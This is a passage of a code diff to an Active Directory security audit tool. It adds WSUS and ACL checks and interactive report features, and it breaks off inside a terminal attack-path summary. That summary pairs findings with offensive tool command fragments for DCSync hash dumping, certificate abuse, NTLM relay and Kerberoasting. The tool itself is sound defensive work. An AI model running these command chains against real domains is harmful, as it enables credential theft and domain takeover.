+                      "(DoNotEnforceEnterpriseTLSCertPinningForUpdateDetection != 0). "
+                      "This allows MITM attacks on WSUS update traffic even when HTTPS is used.",
+                      ["DoNotEnforceEnterpriseTLSCertPinningForUpdateDetection=%d" % val])
+
+    def _s_wsus_user_proxy(self):
+        """S-WSUS-UserProxy — WSUS configured to use user proxy, which can be abused
+        for local privilege escalation when combined with HTTP WSUS."""
+        val = self._get_reg_dword("WindowsUpdate\\AU", "UseWUServer")
+        if val != 1:
+            return
+        url = self._get_reg_value("WindowsUpdate", "WUServer")
+        if url and b"http://" in (url if isinstance(url, bytes) else str(url).encode()):
+            proxy = self._get_reg_dword("WindowsUpdate", "ProxyBehavior")
+            if proxy is None or proxy == 0:
+                self._add("S-WSUS-UserProxy",
+                          "WSUS is configured over HTTP and uses user-context proxy "
+                          "settings. An attacker can inject a user proxy (via WPAD or "
+                          "ProxyAutoConfigUrl) to MITM WSUS updates and execute code as "
+                          "SYSTEM. Use HTTPS for WSUS or disable user proxy for updates.",
+                          ["WSUS HTTP + user proxy"])
 
     # =========================================================================
     # STALE CHECKS (S-)
@@ -7127,6 +7693,10 @@ class CheckEngine:
         self._a_lm_compat()
         self._a_wsus_http_gpo()
         self._a_dsrm_logon()
+        self._s_wsus_nopinning()
+        self._s_wsus_user_proxy()
+        self._p_recovery_mode_gpo()
+        self._p_trusted_credman_gpo()
         # Absence-based checks ("not configured via GPO") MUST NOT run if SYSVOL
         # could not be read — otherwise every setting looks unconfigured and we
         # emit false positives. Only run them when SYSVOL was actually scanned.
@@ -8188,6 +8758,11 @@ class ACLAnalyzer:
                 ace_type = ace["TypeName"]
                 if "DENIED" in ace_type.upper():
                     continue
+                flags = int(ace["AceFlags"])
+                if flags & 0x10:   # INHERITED_ACE — default/inherited, not a delegation
+                    continue
+                if flags & 0x08:   # INHERIT_ONLY — not effective on this object
+                    continue
                 mask = int(ace["Ace"]["Mask"]["Mask"])
                 sid_str_val = self._sid_str(ace["Ace"]["Sid"])
                 principal_name = self._broad.get(sid_str_val)
@@ -8231,8 +8806,8 @@ class ACLAnalyzer:
                         "detail":   f"{principal_name} has {','.join(bits)} on {label}",
                     })
 
-                # WriteProperty (GenericWrite or DS_WRITE_PROP)
-                if mask & (_ACE_GENERIC_WRITE | _ACE_DS_WRITE_PROP):
+                # WriteProperty (GenericWrite or DS_WRITE_PROP) — skip if GenericAll already reported
+                elif mask & (_ACE_GENERIC_WRITE | _ACE_DS_WRITE_PROP):
                     self.data.acl_findings.append({
                         "type":     "write_property",
                         "object":   label,
@@ -8259,6 +8834,11 @@ class ACLAnalyzer:
             try:
                 ace_type = ace["TypeName"]
                 if "DENIED" in ace_type.upper():
+                    continue
+                flags = int(ace["AceFlags"])
+                if flags & 0x10:   # INHERITED_ACE
+                    continue
+                if flags & 0x08:   # INHERIT_ONLY
                     continue
                 mask = int(ace["Ace"]["Mask"]["Mask"])
                 sid_str_val = self._sid_str(ace["Ace"]["Sid"])
@@ -8459,6 +9039,11 @@ class ControlPathAnalyzer:
             for ace in dacl["Data"]:
                 try:
                     if "DENIED" in ace["TypeName"].upper():
+                        continue
+                    flags = int(ace["AceFlags"])
+                    if flags & 0x10:   # INHERITED_ACE
+                        continue
+                    if flags & 0x08:   # INHERIT_ONLY
                         continue
                     mask = int(ace["Ace"]["Mask"]["Mask"])
                     psid = ace["Ace"]["Sid"].formatCanonical()
@@ -8713,6 +9298,11 @@ class ControlPathAnalyzer:
         for ace in dacl["Data"]:
             try:
                 if "DENIED" in ace["TypeName"].upper():
+                    continue
+                flags = int(ace["AceFlags"])
+                if flags & 0x10:   # INHERITED_ACE — skip default/inherited permissions
+                    continue
+                if flags & 0x08:   # INHERIT_ONLY — not effective on this object
                     continue
                 mask = int(ace["Ace"]["Mask"]["Mask"])
                 psid = ace["Ace"]["Sid"].formatCanonical()
@@ -9862,6 +10452,7 @@ html[data-theme=light] .kc-nav{background:rgba(222,218,198,.96)}
 .kc-frow:focus{outline:2px solid var(--accent);outline-offset:-2px}
 .kc-frow-low td{opacity:.7;font-size:12.5px}
 .kc-details summary::-webkit-details-marker{display:none}
+.kc-details summary{list-style:none}
 .kc-details[open] summary{margin-bottom:6px}
 .kc-toggle{display:inline-block;width:18px;height:18px;line-height:16px;text-align:center;border:1px solid var(--border2);
   border-radius:50%;color:var(--muted);font-weight:700;font-size:12px}
@@ -10002,6 +10593,37 @@ html[data-theme=light] .kc-term{background:#21250e;color:#dfe6c4}
 .kc-csvbtn:hover{border-color:var(--accent);color:var(--accent)}
 .kc-aff-more{color:var(--faint);font-size:11.5px;font-style:italic;margin-top:5px}
 
+/* ── vis.js graph ── */
+.kc-graph-legend{display:flex;gap:12px;flex-wrap:wrap;padding:6px 0;font-size:11px;color:var(--muted)}
+.kc-gl{display:inline-flex;align-items:center;justify-content:center;width:16px;height:16px;border-radius:3px;
+  border:1.5px solid;font-size:9px;margin-right:3px;color:#e2e6cb;vertical-align:middle}
+.kc-graph-toolbar{position:absolute;top:8px;right:10px;z-index:10;display:flex;gap:4px}
+.kc-graph-toolbar button{font-family:var(--mono);font-size:10px;background:var(--surface3);
+  border:1px solid var(--border2);color:var(--muted);border-radius:3px;padding:3px 9px;cursor:pointer}
+.kc-graph-toolbar button:hover{border-color:var(--accent);color:var(--accent)}
+#kc-vis-graph canvas{border-radius:var(--r-sm)}
+
+/* ── sortable table headers ── */
+.kc-table.kc-sortable th{cursor:pointer;-webkit-user-select:none;user-select:none;position:relative;padding-right:18px}
+.kc-table.kc-sortable th:hover{color:var(--accent)}
+.kc-table.kc-sortable th::after{content:"⇅";position:absolute;right:4px;font-size:10px;opacity:.35}
+.kc-table.kc-sortable th.kc-asc::after{content:"▲";opacity:.85;color:var(--accent)}
+.kc-table.kc-sortable th.kc-desc::after{content:"▼";opacity:.85;color:var(--accent)}
+.kc-table.kc-sortable th[data-no-sort]{cursor:default;padding-right:12px}
+.kc-table.kc-sortable th[data-no-sort]::after{display:none}
+
+/* ── table pagination ── */
+.kc-tbl-controls{display:flex;justify-content:space-between;align-items:center;margin-top:6px;gap:10px}
+.kc-tbl-pgn{display:flex;gap:4px;align-items:center}
+.kc-tbl-pgn button{font-family:var(--mono);font-size:10px;background:var(--surface3);border:1px solid var(--border2);
+  color:var(--muted);border-radius:3px;padding:3px 9px;cursor:pointer}
+.kc-tbl-pgn button:hover{border-color:var(--accent);color:var(--accent)}
+.kc-tbl-pgn button.on{background:var(--accent);color:#15170f;border-color:var(--accent);font-weight:700}
+.kc-tbl-pgn span{font-family:var(--mono);font-size:10px;color:var(--faint)}
+.kc-tbl-search{background:var(--surface2);border:1px solid var(--border2);color:var(--text);border-radius:10px;
+  padding:4px 10px;font-size:11.5px;outline:none;width:160px}
+.kc-tbl-search:focus{border-color:var(--accent)}
+
 @media print{
   @page{size:A4;margin:13mm}
   html[data-theme]{--bg:#fff;--surface:#fff;--surface2:#f5f3ea;--surface3:#edebde;--border:#bbb;--border2:#999;
@@ -10124,6 +10746,110 @@ function kcCsv(btn){
   setTimeout(function(){URL.revokeObjectURL(url)},1000);
   var o=btn.textContent;btn.textContent='exported ✓';setTimeout(function(){btn.textContent=o},1300);
 }
+/* ── sortable table headers ── */
+function kcSortInit(){
+  document.querySelectorAll('.kc-sortable').forEach(function(tbl){
+    tbl.querySelectorAll('thead th:not([data-no-sort])').forEach(function(th,ci){
+      th.addEventListener('click',function(){
+        var asc=!th.classList.contains('kc-asc');
+        tbl.querySelectorAll('th').forEach(function(h){h.classList.remove('kc-asc','kc-desc')});
+        th.classList.add(asc?'kc-asc':'kc-desc');
+        var tbody=tbl.querySelector('tbody');if(!tbody)return;
+        var rows=[].slice.call(tbody.querySelectorAll('tr'));
+        rows.sort(function(a,b){
+          var ac=(a.children[ci]||{}).textContent||'',bc=(b.children[ci]||{}).textContent||'';
+          var an=parseFloat(ac.replace(/[^\d.-]/g,'')),bn=parseFloat(bc.replace(/[^\d.-]/g,''));
+          if(!isNaN(an)&&!isNaN(bn))return asc?an-bn:bn-an;
+          return asc?ac.localeCompare(bc):bc.localeCompare(ac);});
+        rows.forEach(function(r){tbody.appendChild(r)});
+        kcPgnRefresh(tbl);
+      });
+    });
+  });
+}
+/* ── table pagination ── */
+var KC_PGN={};var KC_PGN_ID=0;
+function kcPgnInit(){
+  document.querySelectorAll('.kc-sortable').forEach(function(tbl){
+    var tbody=tbl.querySelector('tbody');if(!tbody)return;
+    var rows=[].slice.call(tbody.querySelectorAll('tr'));
+    if(rows.length<=25)return;
+    var id='pgn-'+(KC_PGN_ID++);tbl.setAttribute('data-pgn',id);
+    KC_PGN[id]={page:0,perPage:25,total:rows.length};
+    var wrap=document.createElement('div');wrap.className='kc-tbl-controls';
+    var search=document.createElement('input');search.className='kc-tbl-search';
+    search.type='search';search.placeholder='Filter table…';
+    search.addEventListener('input',function(){kcPgnFilter(tbl,search.value)});
+    var pgn=document.createElement('div');pgn.className='kc-tbl-pgn';pgn.id='pgctl-'+id;
+    wrap.appendChild(search);wrap.appendChild(pgn);tbl.parentNode.insertBefore(wrap,tbl.nextSibling);
+    kcPgnRefresh(tbl);
+  });
+}
+function kcPgnRefresh(tbl){
+  var id=tbl.getAttribute('data-pgn');if(!id||!KC_PGN[id])return;
+  var st=KC_PGN[id],tbody=tbl.querySelector('tbody');if(!tbody)return;
+  var rows=[].slice.call(tbody.querySelectorAll('tr:not(.kc-filt-hide)'));
+  st.total=rows.length;var pages=Math.ceil(st.total/st.perPage);
+  if(st.page>=pages)st.page=Math.max(0,pages-1);
+  rows.forEach(function(r,i){r.style.display=(i>=st.page*st.perPage&&i<(st.page+1)*st.perPage)?'':'none'});
+  var ctl=document.getElementById('pgctl-'+id);if(!ctl)return;
+  var h='';
+  if(pages>1){
+    h+='<button onclick="kcPgnGo(\''+id+'\','+Math.max(0,st.page-1)+')"'+(st.page===0?' disabled':'')+'>‹</button>';
+    h+='<span>'+(st.page+1)+' / '+pages+' ('+st.total+' rows)</span>';
+    h+='<button onclick="kcPgnGo(\''+id+'\','+Math.min(pages-1,st.page+1)+')"'+(st.page>=pages-1?' disabled':'')+'>›</button>';
+    h+='<button onclick="kcPgnAll(\''+id+'\')">Show all</button>';
+  }else{h='<span>'+st.total+' rows</span>';}
+  ctl.innerHTML=h;
+}
+function kcPgnGo(id,p){if(!KC_PGN[id])return;KC_PGN[id].page=p;
+  var tbl=document.querySelector('[data-pgn="'+id+'"]');if(tbl)kcPgnRefresh(tbl);}
+function kcPgnAll(id){if(!KC_PGN[id])return;KC_PGN[id].perPage=9999;KC_PGN[id].page=0;
+  var tbl=document.querySelector('[data-pgn="'+id+'"]');if(tbl)kcPgnRefresh(tbl);}
+function kcPgnFilter(tbl,q){
+  var tbody=tbl.querySelector('tbody');if(!tbody)return;q=q.toLowerCase();
+  tbody.querySelectorAll('tr').forEach(function(r){
+    r.classList.toggle('kc-filt-hide',q&&r.textContent.toLowerCase().indexOf(q)===-1)});
+  var id=tbl.getAttribute('data-pgn');if(id&&KC_PGN[id]){KC_PGN[id].page=0;kcPgnRefresh(tbl);}
+}
+/* ── vis.js graph init (CDN) + SVG fallback ── */
+var kcNet=null,kcHierarchical=true,kcUsingSvg=false;
+function kcGraphInit(){
+  var container=document.getElementById('kc-vis-graph');
+  var fb=document.getElementById('kc-svg-fallback');
+  if(!container||!window.KC_GRAPH)return;
+  if(typeof vis==='undefined'){
+    if(fb){fb.style.display='block';container.style.display='none';kcUsingSvg=true;}
+    return;
+  }
+  if(fb)fb.style.display='none';
+  var d=window.KC_GRAPH;
+  var options={
+    layout:{hierarchical:{enabled:true,direction:'LR',sortMethod:'directed',
+      levelSeparation:200,nodeSpacing:70,treeSpacing:80}},
+    physics:{enabled:false},
+    interaction:{hover:true,tooltipDelay:80,zoomView:true,dragView:true,
+      navigationButtons:false,keyboard:{enabled:true}},
+    edges:{width:1.2,selectionWidth:2,hoverWidth:1.6},
+    nodes:{borderWidthSelected:2.4}
+  };
+  kcNet=new vis.Network(container,{nodes:new vis.DataSet(d.nodes),edges:new vis.DataSet(d.edges)},options);
+  kcNet.on('click',function(p){
+    if(p.nodes&&p.nodes.length){
+      var name=p.nodes[0];var el=document.createElement('span');
+      el.setAttribute('data-node',name);kcNode(el);}});
+  kcNet.on('stabilizationIterationsDone',function(){kcNet.fit({animation:{duration:300}})});
+}
+function kcGraphFit(){if(kcNet)kcNet.fit({animation:{duration:400}});}
+function kcGraphToggle(){
+  if(kcUsingSvg||!kcNet)return;kcHierarchical=!kcHierarchical;
+  kcNet.setOptions({layout:{hierarchical:{enabled:kcHierarchical}},
+    physics:{enabled:!kcHierarchical,solver:'forceAtlas2Based',
+      forceAtlas2Based:{gravitationalConstant:-60,centralGravity:0.008,springLength:140}}});
+  if(!kcHierarchical){kcNet.stabilize(200)}
+  else{setTimeout(function(){kcNet.fit({animation:{duration:300}})},100);}
+}
+document.addEventListener('DOMContentLoaded',function(){kcSortInit();kcPgnInit();kcGraphInit()});
 """
 
 
@@ -10605,21 +11331,53 @@ class HTMLReporter:
                 .replace("<", "\\u003c").replace(">", "\\u003e"))
 
     def _control_graph_svg(self):
-        """Server-rendered layered graph of the control paths — the 'visual' an
-        operator can click into. No JS layout dependency; nodes are clickable."""
+        """Control-path graph with vis.js interactive network (CDN) and an
+        inline SVG fallback for offline / file:// viewing.  Both are emitted;
+        JS hides the one that isn't used."""
+        import json as _json
         cp = self._cp(); edges = cp.get("edges") or []; meta = cp.get("nodes") or {}
         if not edges:
             return ""
-        # Only draw nodes that actually participate in an edge — the Tier-0 group
-        # targets with no controller would otherwise render as a column of orphan
-        # boxes and bury the real paths.
         adj = defaultdict(set); radj = defaultdict(set); connected = set()
         for e in edges:
             if e["src"] in meta and e["dst"] in meta:
                 adj[e["src"]].add(e["dst"]); radj[e["dst"]].add(e["src"])
                 connected.add(e["src"]); connected.add(e["dst"])
         names = [n for n in meta if n in connected]
-        # layer = longest distance from a source; relax with a cap to survive cycles
+
+        # ── vis.js data ──────────────────────────────────────────────────
+        _TC = {
+            "user":     {"background": "#3a6e8f", "border": "#4a8ab0", "highlight": {"background": "#4a8ab0", "border": "#6ab6e0"}},
+            "computer": {"background": "#5d7a86", "border": "#7a9baa", "highlight": {"background": "#7a9baa", "border": "#a0c0d0"}},
+            "group":    {"background": "#6b8040", "border": "#8c9e5a", "highlight": {"background": "#8c9e5a", "border": "#b0c47a"}},
+            "gpo":      {"background": "#8b6f3a", "border": "#a88a4d", "highlight": {"background": "#a88a4d", "border": "#c0a060"}},
+            "broad":    {"background": "#9e6a28", "border": "#cb7a2f", "highlight": {"background": "#cb7a2f", "border": "#e0a050"}},
+        }
+        _T0C = {"background": "#8b2820", "border": "#bd4234", "highlight": {"background": "#bd4234", "border": "#e05040"}}
+        _TS = {"user": "dot", "computer": "diamond", "group": "triangle", "gpo": "square", "broad": "triangleDown"}
+        vis_nodes = []
+        for n in names:
+            m = meta[n]; t = m.get("type", "")
+            color = _T0C if m.get("tier0") else _TC.get(t, {"background": "#555", "border": "#777", "highlight": {"background": "#777", "border": "#999"}})
+            vis_nodes.append({"id": n, "label": n if len(n) <= 26 else n[:25] + "…", "title": n,
+                              "color": color, "shape": "star" if m.get("tier0") else _TS.get(t, "dot"),
+                              "size": 18 if m.get("tier0") else 12,
+                              "font": {"color": "#e2e6cb", "size": 11, "face": "JetBrains Mono, monospace"},
+                              "borderWidth": 2 if m.get("tier0") else 1.3})
+        vis_edges = []; seen = set()
+        for e in edges:
+            key = (e["src"], e["dst"], e.get("label", ""))
+            if key in seen or e["src"] not in connected or e["dst"] not in connected:
+                continue
+            seen.add(key)
+            vis_edges.append({"from": e["src"], "to": e["dst"], "label": e.get("label", ""), "arrows": "to",
+                              "color": {"color": "#666", "highlight": "#8c9e5a"},
+                              "font": {"color": "#999", "size": 9, "face": "JetBrains Mono, monospace", "strokeWidth": 0, "align": "top"},
+                              "smooth": {"type": "cubicBezier", "roundness": 0.3}})
+        graph_json = _json.dumps({"nodes": vis_nodes, "edges": vis_edges}, default=str) \
+            .replace("<", "\\u003c").replace(">", "\\u003e")
+
+        # ── static SVG fallback ──────────────────────────────────────────
         layer = {n: 0 for n in names}
         for _ in range(len(names) + 1):
             changed = False
@@ -10637,7 +11395,7 @@ class HTMLReporter:
             layers[lv].sort()
         maxlayer = max(layers) if layers else 0
         rowmax = max((len(v) for v in layers.values()), default=1)
-        NW, NH, GX, GY, MX, MY = 168, 30, 66, 14, 14, 16
+        NW, NH, GX, GY, MX, MY = 190, 34, 72, 16, 16, 18
         width = MX * 2 + (maxlayer + 1) * NW + maxlayer * GX
         height = MY * 2 + rowmax * (NH + GY)
         pos = {}
@@ -10647,17 +11405,15 @@ class HTMLReporter:
             y0 = MY + (height - 2 * MY - total) / 2
             for i, n in enumerate(ns):
                 pos[n] = (x, y0 + i * (NH + GY))
-        def col(n):
+        def _ncol(n):
             m = meta.get(n, {})
-            if m.get("tier0"): return ("rgba(189,66,52,.18)", "var(--crit)")
+            if m.get("tier0"): return ("#8b2820", "#bd4234")
             t = m.get("type", "")
-            if t == "group":   return ("var(--surface3)", "var(--accent2)")
-            if t == "gpo":     return ("var(--surface3)", "var(--accent)")
-            if t == "broad":   return ("rgba(203,122,47,.16)", "var(--high)")
-            if m.get("stale"): return ("var(--surface3)", "var(--warn)")
-            return ("var(--surface3)", "var(--border2)")
+            return {"group": ("#3d4d24", "#6b8040"), "gpo": ("#504020", "#8b6f3a"),
+                    "user": ("#2a4e64", "#3a6e8f"), "computer": ("#3d5260", "#5d7a86"),
+                    "broad": ("#6e4a1a", "#cb7a2f")}.get(t, ("#333", "#555"))
         seg = ['<defs><marker id="kcarr" markerWidth="9" markerHeight="9" refX="8" refY="3" '
-               'orient="auto"><path d="M0,0 L8,3 L0,6 Z" fill="var(--accent)"/></marker></defs>']
+               'orient="auto"><path d="M0,0 L8,3 L0,6 Z" fill="#8c9e5a"/></marker></defs>']
         for e in edges:
             if e["src"] not in pos or e["dst"] not in pos:
                 continue
@@ -10665,22 +11421,40 @@ class HTMLReporter:
             sx, sy = x1 + NW, y1 + NH / 2; ex, ey = x2, y2 + NH / 2
             mx, my = (sx + ex) / 2, (sy + ey) / 2
             seg.append(f'<line x1="{sx:.0f}" y1="{sy:.0f}" x2="{ex:.0f}" y2="{ey:.0f}" '
-                       f'stroke="var(--border2)" stroke-width="1.3" marker-end="url(#kcarr)"/>')
-            seg.append(f'<text x="{mx:.0f}" y="{my-3:.0f}" text-anchor="middle" font-size="9" '
-                       f'fill="var(--muted)" font-family="var(--mono)">{self._e(e["label"])}</text>')
+                       f'stroke="#555" stroke-width="1.3" marker-end="url(#kcarr)"/>')
+            seg.append(f'<text x="{mx:.0f}" y="{my-4:.0f}" text-anchor="middle" font-size="10" '
+                       f'fill="#999" font-family="JetBrains Mono,monospace">{self._e(e["label"])}</text>')
         for n, (x, y) in pos.items():
-            fill, stroke = col(n)
-            lbl = n if len(n) <= 22 else n[:21] + "…"
+            fill, stroke = _ncol(n)
+            lbl = n if len(n) <= 28 else n[:27] + "…"
             seg.append(
                 f'<g class="kc-gnode" role="button" tabindex="0" data-node="{self._e(n)}" '
                 f'onclick="kcNode(this)" onkeydown="if(event.key===\'Enter\'){{kcNode(this)}}">'
                 f'<rect x="{x:.0f}" y="{y:.0f}" width="{NW}" height="{NH}" rx="6" fill="{fill}" '
-                f'stroke="{stroke}" stroke-width="1.4"/>'
+                f'stroke="{stroke}" stroke-width="1.5"/>'
                 f'<text x="{x+NW/2:.0f}" y="{y+NH/2+4:.0f}" text-anchor="middle" font-size="11.5" '
-                f'fill="var(--text)" font-family="var(--sans)">{self._e(lbl)}</text></g>')
-        return (f'<div class="kc-graph-wrap"><svg width="{width:.0f}" height="{height:.0f}" '
-                f'viewBox="0 0 {width:.0f} {height:.0f}" role="img" '
-                f'aria-label="Control-path graph to Tier 0">{"".join(seg)}</svg></div>')
+                f'fill="#e2e6cb" font-family="JetBrains Mono,monospace">{self._e(lbl)}</text></g>')
+        svg_fb = (f'<svg width="{width:.0f}" height="{height:.0f}" '
+                  f'viewBox="0 0 {width:.0f} {height:.0f}" role="img" '
+                  f'aria-label="Control-path graph to Tier 0">{"".join(seg)}</svg>')
+
+        # ── combined output ──────────────────────────────────────────────
+        legend = ('<div class="kc-graph-legend">'
+                  '<span><span class="kc-gl" style="background:#8b2820;border-color:#bd4234">★</span> Tier-0</span>'
+                  '<span><span class="kc-gl" style="background:#6b8040;border-color:#8c9e5a">▲</span> Group</span>'
+                  '<span><span class="kc-gl" style="background:#3a6e8f;border-color:#4a8ab0">●</span> User</span>'
+                  '<span><span class="kc-gl" style="background:#5d7a86;border-color:#7a9baa">◆</span> Computer</span>'
+                  '<span><span class="kc-gl" style="background:#8b6f3a;border-color:#a88a4d">■</span> GPO</span>'
+                  '</div>')
+        toolbar = ('<div class="kc-graph-toolbar">'
+                   '<button onclick="kcGraphFit()" title="Fit to view">⊞ Fit</button>'
+                   '<button onclick="kcGraphToggle()" title="Toggle layout">⇄ Layout</button>'
+                   '</div>')
+        return (f'<div class="kc-graph-wrap" style="max-height:620px;min-height:340px;position:relative">'
+                f'{toolbar}{legend}'
+                f'<div id="kc-vis-graph" style="width:100%;height:500px"></div>'
+                f'<div id="kc-svg-fallback" style="display:none;overflow:auto;max-height:480px">{svg_fb}</div>'
+                f'</div><script>window.KC_GRAPH={graph_json};</script>')
 
     def _edge(self, label):
         return f'<span class="kc-edge">{self._e(label)}</span>'
@@ -11023,7 +11797,7 @@ class HTMLReporter:
                 f'<span class="kc-pg-ar" id="ar-{gid}">▸</span> <strong>{self._e(g)}</strong>'
                 f'<span class="kc-pg-n">{len(uniq)} member(s){warn}</span></div>'
                 f'<div class="kc-pg-b" id="{gid}" style="display:none">'
-                '<table class="kc-table"><thead><tr><th>Account</th><th>Status</th>'
+                '<table class="kc-table kc-sortable"><thead><tr><th>Account</th><th>Status</th>'
                 '<th class="kc-num">Admin</th><th class="kc-num">Pwd age (d)</th>'
                 '<th class="kc-num">Last logon (d)</th><th>Flags</th></tr></thead>'
                 f'<tbody>{rows}</tbody></table></div></div>')
@@ -11157,7 +11931,7 @@ class HTMLReporter:
         t_tbl = (('<div class="kc-sub-h">Certificate templates '
                   '<span style="font-weight:400;text-transform:none;letter-spacing:0;color:var(--faint)">'
                   '— published; vulnerable templates first. ESS = enrollee-supplies-subject</span></div>'
-                  '<table class="kc-table"><thead><tr><th>Template</th><th class="kc-num">Schema</th>'
+                  '<table class="kc-table kc-sortable"><thead><tr><th>Template</th><th class="kc-num">Schema</th>'
                   '<th>Auth EKU</th><th>ESS</th><th>Mgr approval</th><th>Abuse</th></tr></thead>'
                   f'<tbody>{t_rows}</tbody></table>{more}')
                  if t_rows else '<p class="kc-sub">No certificate templates are published to a CA.</p>')
@@ -11237,7 +12011,7 @@ class HTMLReporter:
         weap_tbl = (('<div class="kc-sub-h">GPOs controllable by non-Tier-0 principals '
                      '<span style="font-weight:400;text-transform:none;letter-spacing:0;color:var(--faint)">'
                      '— a non-admin can edit these; the policy applies (runs) across the GPO scope</span></div>'
-                     '<table class="kc-table"><thead><tr><th>GPO</th><th>Controlled by</th>'
+                     '<table class="kc-table kc-sortable"><thead><tr><th>GPO</th><th>Controlled by</th>'
                      '<th>Applies to</th></tr></thead>'
                      f'<tbody>{wrows}</tbody></table>')
                     if wrows else '<p class="kc-sub">No GPO is writable by a broad / non-Tier-0 principal.</p>')
@@ -11337,7 +12111,7 @@ class HTMLReporter:
             more += (f'<div class="kc-aff-more">Also affected: {u}'
                      f'{" …" if len(unresolved) > 10 else ""}.</div>')
         fn = "scout-" + f.rule_id.lower()
-        return ('<div class="kc-aff-tbl"><table class="kc-table"><thead><tr>'
+        return ('<div class="kc-aff-tbl"><table class="kc-table kc-sortable"><thead><tr>'
                 '<th>Account</th><th>Name</th><th>Enabled</th><th>Created</th>'
                 '<th class="kc-num">Pwd set (d)</th><th class="kc-num">Last logon (d)</th>'
                 '<th>Flags</th></tr></thead>'
@@ -11402,7 +12176,8 @@ class HTMLReporter:
                 content = det + ("\n" if det and flat else "") + flat
                 term_block = f'<pre class="kc-term">{content}</pre>'
             parts.append(f'<div class="kc-block"><div class="kc-bh">{hdr}</div>{term_block}{rich}</div>')
-        # 3) narrative — merged desc + why + technical into a single block
+        # 3) narrative — collapsed by default (PingCastle-style: evidence first,
+        #    detail on demand) so the panel stays compact.
         narr_parts = []
         if desc:
             narr_parts.append(self._e(desc))
@@ -11410,13 +12185,15 @@ class HTMLReporter:
             narr_parts.append(self._e(doc["why"]))
         if narr_parts:
             tech = f'<div class="kc-bb kc-mono" style="margin-top:6px">{self._e(doc["technical"])}</div>' if doc.get("technical") else ""
-            parts.append(f'<div class="kc-block"><div class="kc-bh">Analysis</div>'
-                         f'<div class="kc-bb">{" — ".join(narr_parts)}</div>{tech}</div>')
-        # 4) tradecraft
+            parts.append(f'<details class="kc-block kc-details"><summary class="kc-bh" style="cursor:pointer">'
+                         f'Analysis ▸</summary>'
+                         f'<div class="kc-bb">{" — ".join(narr_parts)}</div>{tech}</details>')
+        # 4) tradecraft — collapsed
         if doc.get("exploit"):
             items = "".join(f'<li><code>{self._e(x)}</code><button class="kc-copy" onclick="kcCopy(this)">copy</button></li>' for x in doc["exploit"])
-            parts.append(f'<div class="kc-block kc-attack"><div class="kc-bh">Exploitation</div><ul class="kc-cmd">{items}</ul></div>')
-        # unified remediation (generic + PowerShell)
+            parts.append(f'<details class="kc-block kc-attack kc-details"><summary class="kc-bh" style="cursor:pointer">'
+                         f'Exploitation ▸</summary><ul class="kc-cmd">{items}</ul></details>')
+        # unified remediation (generic + PowerShell) — collapsed
         rem_items = ""
         if doc.get("remediation"):
             rem_items += "".join(f'<li>{self._e(x)}</li>' for x in doc["remediation"])
@@ -11426,8 +12203,8 @@ class HTMLReporter:
             rem_items += "".join(f'<li><code>{self._e(sub(x))}</code>'
                                  f'<button class="kc-copy" onclick="kcCopy(this)">copy</button></li>' for x in ps)
         if rem_items:
-            parts.append(f'<div class="kc-block kc-fix"><div class="kc-bh">Remediation</div>'
-                         f'<ul class="kc-fixlist">{rem_items}</ul></div>')
+            parts.append(f'<details class="kc-block kc-fix kc-details"><summary class="kc-bh" style="cursor:pointer">'
+                         f'Remediation ▸</summary><ul class="kc-fixlist">{rem_items}</ul></details>')
         # 5) framework mappings — collapsed toggle
         fw = self._frameworks_block(f)
         if fw:
@@ -11593,11 +12370,12 @@ class HTMLReporter:
                 f'generated {self._e(self.ts)}</footer>'
                 '<button class="kc-top" onclick="kcJump(\'top\')" title="Back to top">↑</button>')
         registry = '<script>window.KC_NODES=' + self._node_registry_json() + ';</script>'
+        vis_cdn = '<script src="https://cdn.jsdelivr.net/npm/vis-network@9.1.9/standalone/umd/vis-network.min.js"></script>'
         return ('<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="utf-8">'
                 '<meta name="viewport" content="width=device-width,initial-scale=1">'
                 f'<title>{TOOL_NAME} — {self._e(self.domain)}</title><style>' + _KC_CSS +
                 '</style></head><body>' + body + registry +
-                '<script>' + _KC_JS + '</script></body></html>')
+                vis_cdn + '<script>' + _KC_JS + '</script></body></html>')
 
     def _remediation(self, rule_id):
         r = (RULE_DOCS.get(rule_id, {}) or {}).get("remediation")
@@ -11888,6 +12666,48 @@ def main():
             print(f"   {c}{g} {f.severity:8s}{rs} {f.title}")
             if f.details and args.verbose:
                 print(f"     {faint}{f.details[:120]}{rs}")
+        print()
+
+    # ── terminal attack-path summary ─────────────────────────────────────────
+    _PATH_RULES = [
+        ("P-DCSync",               "DCSync → full domain hash dump",       "secretsdump.py -just-dc"),
+        ("P-DangerousACLDomain",   "WriteDACL on domain root → DCSync",   "dacledit + secretsdump"),
+        ("P-ModifiableGPO",        "GPO edit → code exec on DCs",         "pyGPOAbuse"),
+        ("A-CertTempCustomSubject","ESC1 enroll → DA certificate",        "certipy req -upn admin@…"),
+        ("A-CertTemplateESC4",     "ESC4 WriteDACL → DA certificate",     "certipy template"),
+        ("A-CertEnrollHttp",       "ESC8 NTLM relay → DC certificate",    "ntlmrelayx + PetitPotam"),
+        ("S-KerberoastableAdmin",  "Kerberoast DA service account",       "GetUserSPNs.py + hashcat"),
+        ("P-ServiceDomainAdmin",   "DA-privileged service account",       "Kerberoast / credential theft"),
+        ("P-UnconstrainedDelegation", "Unconstrained deleg → TGT capture","printerbug + krbrelayx"),
+        ("P-RBCD-Dangerous",       "RBCD on DC → impersonate DA",         "getST.py -impersonate"),
+        ("P-RBCD",                 "RBCD → impersonate on target host",   "rbcd.py + getST.py"),
+        ("P-GPPPassword",          "GPP cpassword → local admin creds",   "gpp-decrypt"),
+        ("S-SIDHistoryPrivileged", "SID history → privileged SID",        "token abuse"),
+        ("P-ComputerInPrivGroup",  "Machine in DA → SYSTEM = DA",         "SYSTEM key extraction"),
+        ("S-NoPreAuthAdmin",       "AS-REP roast admin (no preauth)",     "GetNPUsers.py + hashcat"),
+        ("A-Pre2kComputer",        "Pre-2k computer → default password",  "pre2k auth / getTGT.py"),
+        ("A-DC-Coerce",            "DC coercion + relay → Tier-0",        "PetitPotam + ntlmrelayx"),
+    ]
+    by_rule = {}
+    for f in findings:
+        by_rule.setdefault(f.rule_id, f)
+    tp = []
+    for rid, desc, tool in _PATH_RULES:
+        f = by_rule.get(rid)
+        if f:
+            who = (str(f.affected[0]).split()[0] if f.affected else "")[:40]
+            tp.append((f.severity, desc, tool, who))
+    if tp:
+        ph = "|== ATTACK PATHS "
+        print(f"{brass}{ph}{'='*max(1,64-len(ph))}|{rs}")
+        for sev, desc, tool, who in tp[:8]:
+            c = _c(ANSI_SEV.get(sev, "")); g = SEV_GLYPH.get(sev, "*")
